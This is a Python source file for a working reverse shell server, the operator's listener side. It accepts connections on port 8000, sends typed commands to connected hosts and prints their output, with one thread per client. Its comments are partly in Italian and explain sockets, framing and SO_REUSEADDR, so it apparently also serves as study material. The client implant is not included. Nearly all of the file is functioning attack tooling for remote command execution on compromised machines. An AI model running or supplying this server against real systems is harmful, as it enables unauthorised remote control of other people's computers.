#!/usr/bin/env python3
"""
Reverse Shell Server - Version with configurable IP address.
This server listens for incoming reverse shell connections and allows command execution.
"""

import socket
import struct
import threading

def get_server_ip():
    """
    Prompts the user to enter a valid IP address for the server to bind to.
    Allows binding to all interfaces using 0.0.0.0.
    """
    while True:
        ip = input("Enter server IP address (use 0.0.0.0 for all interfaces): ").strip()
        if not ip:
            print("You must enter a valid IP address.")
            continue
        if ip == "0.0.0.0":
            return ip
        try:
            socket.inet_aton(ip)  # Validate IP format
            return ip
        except socket.error:
            print(f"Invalid IP address: {ip}. Try again.")

def reliable_send(sock, data):
    """
    Sends data to the client with a 4-byte length prefix.
    This ensures proper framing and data reconstruction on the other side.
    """
    if isinstance(data, str):#restituisce True se data è una stringa (oggetto di tipo str), altrimenti False
        data = data.encode()  # Convert to bytes if necessary
    #Byte più significativo: Il "big end" (byte più significativo) è il byte che ha il valore più alto e viene memorizzato per primo, all'inizio del blocco di dati.
    sock.sendall(struct.pack('>I', len(data)))  # Send the length as big-endian
    sock.sendall(data)  # Then send the actual data

def reliable_recv(sock):
    """
    Receives data that includes a 4-byte length prefix.
    Ensures the full message is properly received.
    """
    raw_len = sock.recv(4)  # First 4 bytes represent message length, legge fino a 4 byte dal socket e restituisce un oggetto bytes
    if not raw_len:
        return None  # Connection closed or error
    data_len = struct.unpack('>I', raw_len)[0]  # Extract message length
    return sock.recv(data_len)  # Receive the complete data

def handle_client(client_socket, addr):
    """
    Handles communication with a single connected client.
    Receives commands from the user, sends them to the client, and prints the output.
    """
    try:
        print(f"\n[+] Connection accepted from {addr[0]}:{addr[1]}")
        while True:
            # Prompt operator for a command
            command = input(f"\n{addr[0]}$ ").strip()
            if not command:
                continue  # Skip empty commands

            reliable_send(client_socket, command)  # Send command to client

            if command.lower() == 'exit':
                break  # Terminate session

            output = reliable_recv(client_socket)  # Receive response from client
            if output:
                print(output.decode('utf-8', 'ignore'))  # Print decoded output
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()  # Ensure the socket is closed
        print(f"[!] Connection closed with {addr[0]}")

def start_server(server_ip):
    """
    Starts the TCP server and listens for incoming client connections.
    Each connection is handled in a separate thread.
    """
    server_port = 8000  # Default port for the reverse shell server
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) crea un socket TCP IPv4 in Python e lo assegna alla variabile server.

    Dettaglio dei parametri:

    socket.AF_INET → famiglia di indirizzi IPv4 (host:porta, es. ("0.0.0.0", 8080)).

    socket.SOCK_STREAM → tipo di socket “stream” = TCP (connessione affidabile, orientata alla sessione).
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    """
    Cosa fa

    Abilita SO_REUSEADDR: permette di riusare subito lo stesso indirizzo IP/porta per fare bind() anche se il socket precedente è ancora in stato TIME_WAIT (tipico dopo aver riavviato un server). In pratica evita l’errore:

    OSError: [Errno 98] Address already in use

    Quando serve

    Quando riavvii spesso un servizio e vuoi tornare ad ascoltare senza attendere che scada il TIME_WAIT.

    In fase di sviluppo/test, per non “rimanere bloccato” dopo uno stop&start rapido.

    Cosa non fa

    Non permette a più processi di ascoltare contemporaneamente sulla stessa <IP, porta>.
    Per quello su Linux esiste SO_REUSEPORT:

    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)  # Linux >= 3.9


    Non aggira un bind già attivo e funzionante di un altro processo sullo stesso IP/porta.
    """
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow address reuse

    server.bind((server_ip, server_port))  # Bind to the given IP and port, aggancia (lega) il socket all’indirizzo locale e alla porta su cui deve stare in ascolto
    server.listen(5)  # Listen for up to 5 queued connections

    print(f"\n[*] Server listening on {server_ip}:{server_port}")
    print("[*] Press Ctrl+C to stop the server\n")

    try:
        while True:
            client_socket, addr = server.accept()  # Accept incoming client
            # Handle client in a separate thread
            client_thread = threading.Thread(
                target=handle_client,
                args=(client_socket, addr)
            )
            client_thread.daemon = True  # Daemon thread will exit when main program exits
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
    finally:
        server.close()  # Clean up socket

# Entry point of the script
if __name__ == "__main__":
    print("=== Reverse Shell Server ===")
    server_ip = get_server_ip()
    start_server(server_ip)
